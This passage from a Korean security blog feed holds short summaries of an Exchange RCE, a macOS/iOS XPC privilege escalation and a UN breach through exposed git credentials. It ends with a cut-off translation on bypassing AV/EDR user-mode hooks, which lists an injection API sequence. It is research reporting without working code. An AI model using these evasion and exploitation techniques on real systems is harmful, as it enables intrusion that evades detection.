<code>0x7fffffff</code>&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0;&#xB9CC; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. splwow64&#xC5D0;&#xC11C; &#xD799;&#xC740; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xBBC0;&#xB85C;(ex. <code>0x7d7c70</code>) &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>information disclosure</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16875: RCE in MS Office 365</title>
    <link href="/2021/01/13/fabu1ous/2021-01-13/"/>
    <url>/2021/01/13/fabu1ous/2021-01-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html">https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Exchange server released Before 09/08/2020</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft office 365 Exchange server&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; CVE-2020-16875&#xC758; write-up&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>New-DlpPolicy</code> cmdlet&#xC758; validation &#xC791;&#xC5C5;&#xC744; &#xD558;&#xB294;  <code>NewDlpPolicy.InternalValidate()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xB85C;&#xBD80;&#xD130; &#xBC1B;&#xC740; TemplateData&#xB97C;  pipeline&#xC5D0; &#xCD94;&#xAC00;&#xD55C; &#xD6C4; Powershell command&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; code injection&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; SYSTEM&#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> <code>NewDlpPolicy.InternalValidate()</code>&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>DlpPolicyTemplateMetaData.ValidateCmdletParameters()</code> &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li>Inline command &#xC0AC;&#xC6A9;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD55C; &#xAC80;&#xC0AC; &#xC218;&#xD589;</li><li>validate &#xD558;&#xB824;&#xB294; command &#xBB38;&#xC790;&#xC5F4;&#xC774;  <code>New-TransportRule</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;</li><li>validate &#xD558;&#xB824;&#xB294; command &#xBB38;&#xC790;&#xC5F4;&#xC774; <code>-DlpPolicy</code>&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs">https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs</a>.</p><p><a href="https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps">https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>exchange</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>office 365</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-9971 : macOS/iOS XPC 서비스 관리 앱에서 발견된 권한 상승 취약점</title>
    <link href="/2021/01/12/l0ch/2021-01-12/"/>
    <url>/2021/01/12/l0ch/2021-01-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xlab.tencent.com/en/2021/01/11/cve-2020-9971-abusing-xpc-service-to-elevate-privilege/">CVE-2020-9971 Abusing XPC Service mechanism to elevate privilege in macOS/iOS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>macOS &lt; Big Sur<br>iOS  &lt; 13.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>launchd&#xB294; macOS&#xC5D0;&#xC11C; <code>inetd</code>, <code>xinted</code>&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xAD00;&#xB9AC; &#xB370;&#xBAAC;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xB7EC;&#xD55C; <code>launchd</code> &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xD1B5;&#xC2E0; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; XPC &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD560; &#xB54C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>launchd</code>&#xB294; <code>launchd process domain</code> &#xC744; &#xD1B5;&#xD574; XPC &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xC81C;&#xD55C;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB3C4;&#xBA54;&#xC778;&#xC740; &#xC18C;&#xC720;&#xC790; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB9CC; &#xC218;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Big Sur &#xC774;&#xC804;&#xC758; <code>launchd</code>&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB3C4;&#xBA54;&#xC778;&#xC5D0; XPC&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xB54C; &#xD638;&#xCD9C;&#xC790; pid&#xC640; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB3C4;&#xBA54;&#xC778;&#xC758; &#xC18C;&#xC720;&#xC790; pid&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB2E4;&#xB978; &#xC784;&#xC758;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; XPC &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;(&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;)&#xAC00; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xB3C4;&#xBA54;&#xC778;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; XPC &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xCD94;&#xAC00;&#xB41C; XPC &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>iOS &#xB610;&#xD55C; macOS&#xC640; &#xB3D9;&#xC77C;&#xD55C; <code>launchd</code> &#xB85C;&#xC9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70; iOS 13.5 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC560;&#xD50C;&#xC740; &#xD638;&#xCD9C;&#xC790; pid&#xAC00; &#xB300;&#xC0C1; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB3C4;&#xBA54;&#xC778;&#xC758; &#xC18C;&#xC720;&#xC790;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD328;&#xCE58;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>ios</tag>
      
      <tag>apple</tag>
      
      <tag>L0ch</tag>
      
      <tag>macos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 유엔환경계획(UNEP) 10만명 이상 직원 기록 접근</title>
    <link href="/2021/01/11/idioth/2021-01-11/"/>
    <url>/2021/01/11/idioth/2021-01-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://johnjhacking.com/blog/unep-breach/">UNEP Breached, 100K+ Employee Records Accessed</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ilo.org</li><li>unep.org</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC720;&#xC5D4;&#xC5D0;&#xC11C; Git Credentials&#xC774; &#xB178;&#xCD9C;&#xB41C; endpoint&#xB97C; &#xD1B5;&#xD574; &#xC9C1;&#xC6D0;&#xB4E4;&#xC758; &#xAE30;&#xB85D; &#xBC0F; &#xD504;&#xB85C;&#xC81D;&#xD2B8;, &#xBCF4;&#xACE0;&#xC11C; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. ilo.org&#xC758; &#xD558;&#xC704; &#xB3C4;&#xBA54;&#xC778;&#xC5D0; &#xB178;&#xCD9C;&#xB41C; .git content&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. <a href="https://github.com/arthaud/git-dumper">git-dumper</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xD3F4;&#xB354;&#xB97C; &#xB364;&#xD504;&#xD560; &#xC218; &#xC788;&#xACE0; &#xCF54;&#xB4DC;&#xC5D0; &#xB178;&#xCD9C;&#xB41C; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC73C;&#xB85C; mysql &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC640; survey management platform&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/11/idioth/2021-01-11/image0.png" alt></p><p>&#xB610;&#xD55C; unep.org&#xC5D0;&#xC11C;  <code>.git-credentials</code>&#xAC00; &#xB178;&#xCD9C;&#xB41C; &#xC11C;&#xBE0C; &#xB3C4;&#xBA54;&#xC778;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. GitHub credentials&#xB97C; &#xD1B5;&#xD574; private project&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xBC0F; &#xAC01;&#xC885; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC815;&#xBCF4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/11/idioth/2021-01-11/image1.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>git dump</tag>
      
      <tag>git credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] MeMFuck: 유저 모드 후킹 우회</title>
    <link href="/2021/01/10/idioth/memfuck/"/>
    <url>/2021/01/10/idioth/memfuck/</url>
    
    <content type="html"><![CDATA[<blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://winternl.com/memfuck/">MemFuck: Bypassing User-Mode Hooks</a></p></blockquote><h2 id="&#xC11C;&#xBB38;"><a href="#&#xC11C;&#xBB38;" class="headerlink" title="&#xC11C;&#xBB38;"></a>&#xC11C;&#xBB38;</h2><p>&#xB3D9;&#xC801; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC740; &#xB9CE;&#xC740; AV/EDR/MDS&#xC5D0;&#xC11C; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xB294;&#xB370; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xB2E4;. &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC740; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xACFC; &#xB2EC;&#xB9AC; &#xC2E4;&#xD589; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xC708;&#xB3C4;&#xC6B0; API &#xD638;&#xCD9C;&#xC744; &#xCEA1;&#xCC98;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xD558;&#xBA70; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xBCF4;&#xB2E4; &#xD0D0;&#xC9C0;&#xC728;&#xC774; &#xB192;&#xB2E4;. system call&#xC744; &#xCEA1;&#xCC98;&#xD558;&#xB294;  &#xB9CE;&#xC740; &#xAE30;&#xC220;&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xAC00;&#xC7A5; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; user-level hook&#xC774;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; hook&#xC740; &#xC545;&#xC131; &#xAE30;&#xB2A5;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xAC00;&#xB85C;&#xCC48;&#xB2E4;. &#xC784;&#xC758; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; API &#xD638;&#xCD9C;&#xC758; &#xC2DC;&#xD000;&#xC2A4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs ebnf"><span class="hljs-attribute">OpenProcess</span><span class="hljs-attribute">VirtualAllocEx</span><span class="hljs-attribute">WriteProcessMemory</span><span class="hljs-attribute">CreateRemoteThreadEx</span><span class="hljs-attribute">QueueUserAPC</span><span class="hljs-attribute">NtAlertResumeThread</span></code></pre><p>&#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB4E4;&#xC740; &#xD638;&#xCD9C;&#xC774;&#xB098; &#xADF8; &#xC870;&#xD569;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC815;&#xC758;&#xD55C;&#xB2E4;. &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC758; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xD2B9;&#xC815;&#xD55C; &#xD638;&#xCD9C; &#xC870;&#xD569;&#xC740; &#xCF54;&#xB4DC; &#xC778;&#xC81D;&#xC158;&#xC774;&#xBA70; &#xB300;&#xBD80;&#xBD84; &#xC545;&#xC758;&#xC801;&#xC774;&#xAC70;&#xB098; &#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD589;&#xB3D9;&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xB41C;&#xB2E4;.</p><p>user-mode hook&#xC740; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC640; NGAV, EDR, sandbox, anti-cheat, DRM &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xB9CE;&#xC740; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xACFC; &#xD234;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;. user-mode hook&#xC740; &#xAD6C;&#xD604;&#xD558;&#xAE30; &#xC27D;&#xACE0;, &#xC548;&#xC815;&#xC801;&#xC774;&#xACE0;, &#xAC04;&#xB2E8;&#xD558;&#xBA70; &#xC131;&#xB2A5; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xC801;&#xB2E4;.</p><p>&#xB300;&#xBD80;&#xBD84; user-land hook&#xC740; inline hook&#xC774;&#xBA70; control flow&#xB97C; custom handler&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xD2B8; &#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xB300;&#xC0C1; &#xD568;&#xC218; rewrite&#xB97C; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;. &#xD578;&#xB4E4;&#xB7EC;&#xC758; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;&#xC740; &#xBCF4;&#xC874;&#xB418;&#xACE0; &#xC694;&#xCCAD;&#xB41C; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC70;&#xB098; &#xBD84;&#xC11D;&#xD560;&#xC9C0; &#xACB0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xAC83;&#xB4E4;&#xC740; &#xC798; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC774;&#xB7EC;&#xD55C; &#xAC1C;&#xB150;&#xC5D0; &#xC775;&#xC219;&#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xAC00;&#xC815;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><h2 id="32-bit-Hooks"><a href="#32-bit-Hooks" class="headerlink" title="32-bit Hooks"></a>32-bit Hooks</h2><p><img src="/2021/01/10/idioth/memfuck/image0.png" alt></p><p>32&#xBE44;&#xD2B8; user-land hook&#xC774; &#xD3EC;&#xD568;&#xB41C;&#xB2E4;. 32&#xBE44;&#xD2B8; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xAC00;&#xB2A5;&#xD55C; &#xAE4A;&#xC740; &#xC704;&#xCE58;&#xC5D0;&#xC11C; hook &#xD558;&#xBA70; ntdll&#xC5D0; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; &#xD568;&#xC218;&#xB4E4;(NtQueueApcThread &#xB4F1;)&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xC740; system call&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC6D0;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. Ring3 &#xD6C4;&#xD0B9;&#xC73C;&#xB85C; &#xBAA8;&#xB4E0; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xD544;&#xC790;&#xB294; 5&#xB144; &#xB3D9;&#xC548; 32&#xBE44;&#xD2B8; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xC811;&#xD55C; &#xACBD;&#xC6B0;&#xAC00; &#xD558;&#xB098;&#xB3C4; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xACBD;&#xC6B0;&#xC778; WoW64&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; 32&#xBE44;&#xD2B8; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCFC; &#xAC83;&#xC774;&#xB2E4;.</p><h2 id="WoW64&#xC5D0;&#xC11C;&#xC758;-32&#xBE44;&#xD2B8;-&#xD6C4;&#xD0B9;"><a href="#WoW64&#xC5D0;&#xC11C;&#xC758;-32&#xBE44;&#xD2B8;-&#xD6C4;&#xD0B9;" class="headerlink" title="WoW64&#xC5D0;&#xC11C;&#xC758; 32&#xBE44;&#xD2B8; &#xD6C4;&#xD0B9;"></a>WoW64&#xC5D0;&#xC11C;&#xC758; 32&#xBE44;&#xD2B8; &#xD6C4;&#xD0B9;</h2><p><img src="/2021/01/10/idioth/memfuck/image1.png" alt></p><p>&#xAC00;&#xC7A5; &#xD754;&#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB294; Wow64&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; 32&#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;(64&#xBE44;&#xD2B8; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;). NGAV&#xC640; EDR&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0;&#xC11C;&#xC758; hook &#xAD6C;&#xD604;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC740; x86 &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC601;&#xC5ED;&#xC5D0;&#xC11C;&#xB9CC; hook&#xC744; &#xD55C;&#xB2E4;. user-mode hook&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB294; WoW64 layer&#xC5D0; hook&#xC744; &#xC704;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC9C0;&#xB9CC; &#xBAA8;&#xB4E0; &#xC5C5;&#xCCB4;&#xAC00; &#xADF8;&#xAC83;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xB294;&#xB2E4;. <a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">Sophos &#xC6B0;&#xD68C;&#xC5D0; &#xAD00;&#xD55C; MDSec&#xC758; &#xAC8C;&#xC2DC;&#xAE00;</a>&#xC744; &#xBCF4;&#xC544;&#xB77C;.</p><p>&#xB9CE;&#xC740; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xB4E4;&#xC774; 32&#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; WoW64 &#xC2E4;&#xD589;&#xC744; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC740; &#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC5C8;&#xACE0; <a href="https://blog.malwarebytes.com/threat-analysis/2018/01/a-coin-miner-with-a-heavens-gate/">&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC81C;&#xC791;&#xC790;</a>&#xC640; <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">red-team</a>&#xC5D0; &#xC758;&#xD574; &#xACF5;&#xACA9;&#xB2F9;&#xD588;&#xB2E4;. &#xD544;&#xC790;&#xAC00; &#xBD84;&#xC11D;&#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC911;&#xC5D0; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740; &#xAC83;&#xB4E4;&#xC774; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf&#x2019;s wow64ext</a>&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294;&#xC9C0; &#xB9D0;&#xD560; &#xC218; &#xC5C6;&#xB2E4;.</p><h2 id="&#xC694;&#xC57D;-&#xAE30;&#xC874;-&#xAE30;&#xC220;"><a href="#&#xC694;&#xC57D;-&#xAE30;&#xC874;-&#xAE30;&#xC220;" class="headerlink" title="&#xC694;&#xC57D; : &#xAE30;&#xC874; &#xAE30;&#xC220;"></a>&#xC694;&#xC57D; : &#xAE30;&#xC874; &#xAE30;&#xC220;</h2><ul><li>&#xB2E8;&#xC21C;&#xD788; &#xD568;&#xC218;&#xC758; Ntdll &#xBC84;&#xC804;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;</li><li><a href="https://web.archive.org/web/20190407064851/https://blog.ensilo.com/globeimposter-ransomware-technical">&#xD568;&#xC218;&#xC758; Wow64 &#xBC84;&#xC804;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;</a></li><li><a href="https://cdn2.hubspot.net/hubfs/487909/ENSILO%20WHITEPAPER%20ENTER%20THE%20DARK%20GATE.pdf">&#xC9C1;&#xC811; Syscall &#xD638;&#xCD9C;</a></li><li>&#xC6D0;&#xBCF8; thunk &#xCD94;&#xC801; (<a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">FireWalker</a>)</li><li><a href="https://blog.malwarebytes.com/threat-analysis/2018/03/hancitor-fileless-attack-with-a-copy-trick/">&#xBCF4;&#xC870; DLL &#xB9E4;&#xD551;</a></li><li>Code splicing (byte stealing)</li></ul><p>&#xBAA8;&#xB450; &#xC798; &#xC791;&#xB3D9;&#xD558;&#xACE0; &#xC88B;&#xC9C0;&#xB9CC; 64&#xBE44;&#xD2B8; &#xBC84;&#xC804;&#xC758; ntdll&#xC5D0; &#xC704;&#xCE58;&#xD55C; hook&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xD544;&#xC790;&#xC758; &#xAD00;&#xCC30;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xB808;&#xBCA8;&#xC758; hook&#xC740; &#xC5B4;&#xB5A4; public &#xCF54;&#xB4DC;&#xB85C;&#xB3C4; &#xBCF8; &#xC801;&#xC774; &#xC5C6;&#xACE0; &#xC5B4;&#xB5A4; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB3C4; 